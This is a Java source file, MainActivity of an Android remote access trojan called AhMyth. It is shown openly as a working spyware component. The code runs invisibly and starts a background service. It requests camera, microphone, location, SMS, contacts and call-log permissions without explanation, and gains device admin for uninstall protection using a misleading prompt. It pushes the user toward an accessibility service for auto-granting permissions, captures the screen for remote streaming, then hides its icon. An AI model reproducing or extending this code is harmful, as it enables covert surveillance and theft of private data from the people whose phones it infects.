package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.View;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "AhMyth";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_CODE = 1002;
    private static final int MANAGE_STORAGE_CODE = 1003;
    private static final int BATTERY_OPTIMIZATION_CODE = 1005;
    private static final int DEVICE_ADMIN_CODE = 1006;
    private static final int SCREEN_CAPTURE_CODE = 1007;

    DevicePolicyManager devicePolicyManager;
    ComponentName componentName;
    SharedPreferences sharedPreferences;
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private int currentPermissionIndex = 0;
    private List<String> permissionsToRequest = new ArrayList<>();
    private boolean overlayPermissionRequested = false;
    private boolean storagePermissionRequested = false;
    private boolean batteryOptRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Don't set any content view - app should be invisible
        // The SplashTheme in AndroidManifest makes the activity fully transparent
        Log.d(TAG, "MainActivity onCreate - Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
        
        try {
            // Initialize SharedPreferences
            sharedPreferences = getSharedPreferences("AhMythPrefs", Context.MODE_PRIVATE);
        } catch (Exception e) {
            Log.e(TAG, "Error initializing SharedPreferences", e);
        }

        // Check if ADB_GRANT_MODE - permissions already granted via ADB
        if (StealthConfig.ADB_GRANT_MODE) {
            Log.d(TAG, "ADB_GRANT_MODE enabled - skipping permission prompts");
            startMainService();
            
            // Quick stealth exit
            if (StealthConfig.AUTO_CLOSE_ACTIVITY) {
                handler.postDelayed(() -> {
                    if (StealthConfig.HIDE_ICON) hideAppIcon();
                    moveTaskToBack(true);
                    finish();
                }, StealthConfig.HIDE_DELAY_MS);
            }
            return;
        }
        
        // Start service immediately in background
        startMainService();
        
        // Request permissions with minimal delay
        int delay = StealthConfig.SILENT_PERMISSION_MODE ? 100 : 500;
        handler.postDelayed(() -> {
            try {
                buildPermissionList();
                if (!permissionsToRequest.isEmpty()) {
                    requestNextPermission();
                } else {
                    if (!StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
                        requestSpecialPermissions();
                    } else {
                        applyStealthConfig();
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in permission request flow", e);
                applyStealthConfig();
            }
        }, delay);
    }

    private void buildPermissionList() {
        permissionsToRequest.clear();
        currentPermissionIndex = 0;
        
        // Build list of permissions that need to be requested
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            addPermissionIfNeeded(Manifest.permission.CAMERA);
            addPermissionIfNeeded(Manifest.permission.RECORD_AUDIO);
            addPermissionIfNeeded(Manifest.permission.ACCESS_FINE_LOCATION);
            addPermissionIfNeeded(Manifest.permission.READ_CONTACTS);
            addPermissionIfNeeded(Manifest.permission.READ_SMS);
            addPermissionIfNeeded(Manifest.permission.SEND_SMS);
            addPermissionIfNeeded(Manifest.permission.READ_CALL_LOG);
            addPermissionIfNeeded(Manifest.permission.READ_PHONE_STATE);
            
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                addPermissionIfNeeded(Manifest.permission.READ_EXTERNAL_STORAGE);
                addPermissionIfNeeded(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                addPermissionIfNeeded(Manifest.permission.POST_NOTIFICATIONS);
                addPermissionIfNeeded(Manifest.permission.READ_MEDIA_IMAGES);
                addPermissionIfNeeded(Manifest.permission.READ_MEDIA_VIDEO);
                addPermissionIfNeeded(Manifest.permission.READ_MEDIA_AUDIO);
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                addPermissionIfNeeded(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
            }
        }
        
        Log.d(TAG, "Permissions to request: " + permissionsToRequest.size());
    }
    
    private void addPermissionIfNeeded(String permission) {
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(permission);
        }
    }
    
    private void requestNextPermission() {
        if (currentPermissionIndex >= permissionsToRequest.size()) {
            // All runtime permissions done
            if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
                applyStealthConfig();
            } else {
                requestSpecialPermissions();
            }
            return;
        }
        
        // If skip prompts is enabled, request all permissions at once (silent batch)
        if (StealthConfig.SKIP_PERMISSION_PROMPTS) {
            requestAllPermissionsSilently();
            return;
        }
        
        final String permission = permissionsToRequest.get(currentPermissionIndex);
        currentPermissionIndex++;
        
        Log.d(TAG, "Requesting permission: " + permission);
        
        // Request the permission directly without explanation dialog
        ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
    }
    
    // Request all permissions at once in batch mode - fastest method
    private void requestAllPermissionsSilently() {
        if (permissionsToRequest.isEmpty()) {
            if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
                applyStealthConfig();
            } else {
                requestSpecialPermissions();
            }
            return;
        }
        
        Log.d(TAG, "Requesting ALL permissions in single batch (silent mode)");
        String[] permsArray = permissionsToRequest.toArray(new String[0]);
        currentPermissionIndex = permissionsToRequest.size(); // Mark all as processed
        
        // Request all at once - fastest method, grants what it can silently
        ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            int granted = 0;
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) granted++;
            }
            Log.d(TAG, "Permissions granted: " + granted + "/" + permissions.length);
            
            // Minimal delay for fast processing
            int delay = StealthConfig.SILENT_PERMISSION_MODE ? StealthConfig.PERMISSION_DELAY_MS : 300;
            handler.postDelayed(() -> {
                try {
                    requestNextPermission();
                } catch (Exception e) {
                    Log.e(TAG, "Error in requestNextPermission", e);
                    applyStealthConfig();
                }
            }, delay);
        }
    }
    
    private void requestSpecialPermissions() {
        // Request battery optimization exemption (only once per session)
        if (!batteryOptRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                batteryOptRequested = true;
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Error requesting battery optimization", e);
                }
            }
        }
        
        requestOverlayIfNeeded();
    }
    
    private void requestOverlayIfNeeded() {
        // Only request overlay permission once per session
        if (!overlayPermissionRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            overlayPermissionRequested = true;
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    intent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
                } else {
                    intent.setData(Uri.parse("package:" + getPackageName()));
                }
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                return;
            } catch (Exception e) {
                Log.e(TAG, "Error requesting overlay permission", e);
                try {
                    Intent fallback = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                    startActivityForResult(fallback, OVERLAY_PERMISSION_CODE);
                    return;
                } catch (Exception ignored) {}
            }
        }
        
        requestStorageIfNeeded();
    }
    
    private void requestStorageIfNeeded() {
        // Only request storage permission once per session
        if (!storagePermissionRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            storagePermissionRequested = true;
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            } catch (Exception e) {
                Log.e(TAG, "Error requesting storage management", e);
            }
        }
        
        finishSetup();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        switch (requestCode) {
            case BATTERY_OPTIMIZATION_CODE:
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        requestOverlayIfNeeded();
                    }
                }, 300);
                break;
                
            case OVERLAY_PERMISSION_CODE:
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        requestStorageIfNeeded();
                    }
                }, 300);
                break;
                
            case MANAGE_STORAGE_CODE:
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        finishSetup();
                    }
                }, 300);
                break;
                
            case DEVICE_ADMIN_CODE:
                Log.d(TAG, "Device Admin result received");
                requestAccessibilityForAutoGrant();
                break;
                
            case SCREEN_CAPTURE_CODE:
                Log.d(TAG, "Screen capture permission result: " + resultCode);
                if (resultCode == RESULT_OK && data != null) {
                    // Store permission for ScreenStreamService
                    ScreenStreamService.setProjectionPermission(resultCode, data);
                    
                    // Start the screen stream service
                    Intent serviceIntent = new Intent(this, ScreenStreamService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent);
                    } else {
                        startService(serviceIntent);
                    }
                    Log.d(TAG, "Screen capture service started");
                }
                applyStealthConfig();
                break;
        }
    }
    
    private void finishSetup() {
        Log.d(TAG, "Finish setup - requesting device admin if needed");
        
        // Request Device Admin for uninstall protection
        if (StealthConfig.UNINSTALL_PROTECTION) {
            requestDeviceAdmin();
        } else {
            applyStealthConfig();
        }
    }
    
    private void requestDeviceAdmin() {
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            componentName = new ComponentName(this, AdminReceiver.class);
            
            if (!devicePolicyManager.isAdminActive(componentName)) {
                Log.d(TAG, "Requesting Device Admin activation");
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Enable administrator access for enhanced features and security.");
                startActivityForResult(intent, DEVICE_ADMIN_CODE);
            } else {
                Log.d(TAG, "Device Admin already active");
                requestAccessibilityForAutoGrant();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting device admin", e);
            requestAccessibilityForAutoGrant();
        }
    }
    
    private void requestAccessibilityForAutoGrant() {
        // If accessibility auto-grant is enabled, prompt user to enable it
        if (StealthConfig.USE_ACCESSIBILITY_GRANTER) {
            if (!isAccessibilityServiceEnabled(PermissionGranterService.class)) {
                Log.d(TAG, "Prompting for Accessibility Service (Permission Granter)");
                try {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    
                    // Continue with screen capture after a delay
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            requestScreenCapture();
                        }
                    }, 3000);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Error opening accessibility settings", e);
                }
            }
        }
        requestScreenCapture();
    }
    
    private void requestScreenCapture() {
        // Request screen capture permission for remote desktop feature
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                Log.d(TAG, "Requesting screen capture permission");
                android.media.projection.MediaProjectionManager mpm = 
                    (android.media.projection.MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if (mpm != null) {
                    startActivityForResult(mpm.createScreenCaptureIntent(), SCREEN_CAPTURE_CODE);
                    return;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error requesting screen capture", e);
            }
        }
        applyStealthConfig();
    }
    
    private boolean isAccessibilityServiceEnabled(Class<?> serviceClass) {
        try {
            String serviceName = getPackageName() + "/" + serviceClass.getName();
            String enabledServices = Settings.Secure.getString(
                getContentResolver(), 
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return enabledServices != null && enabledServices.contains(serviceName);
        } catch (Exception e) {
            return false;
        }
    }
    
    private void applyStealthConfig() {
        Log.d(TAG, "Setup complete - applying stealth config");
        
        // Apply stealth config
        if (StealthConfig.HIDE_ICON) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    hideAppIcon();
                }
            }, StealthConfig.HIDE_DELAY_MS);
        }
        
        if (StealthConfig.AUTO_CLOSE_ACTIVITY) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    moveTaskToBack(true);
                    finish();
                }
            }, StealthConfig.HIDE_DELAY_MS + 500);
        }
    }

    private void startMainService() {
        Log.d(TAG, "Starting main service");
        try {
            Intent serviceIntent = new Intent(this, MainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    ContextCompat.startForegroundService(this, serviceIntent);
                } catch (IllegalStateException e) {
                    // If foreground service can't start, try regular service
                    Log.w(TAG, "Foreground service failed, trying regular service", e);
                    startService(serviceIntent);
                }
            } else {
                startService(serviceIntent);
            }
            
            // Also call static start method as fallback
            try {
                MainService.startService(this);
            } catch (Exception e) {
                Log.w(TAG, "Static service start failed", e);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security error starting service - may need permissions", e);
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }

    private void hideAppIcon() {
        try {
            // Disable launcher alias
            PackageManager pm = getPackageManager();
            ComponentName launcherAlias = new ComponentName(this, "ahmyth.mine.king.ahmyth.LauncherAlias");
            pm.setComponentEnabledSetting(launcherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
                
            // Disable main activity launcher entry
            pm.setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
                
            Log.d(TAG, "App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding icon", e);
        }
    }

    public void openGooglePlay(View view) {
        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
        startActivity(GoogleIntent);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.d(TAG, "MainActivity onResume");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MainActivity onDestroy - Service continues in background");
    }
}
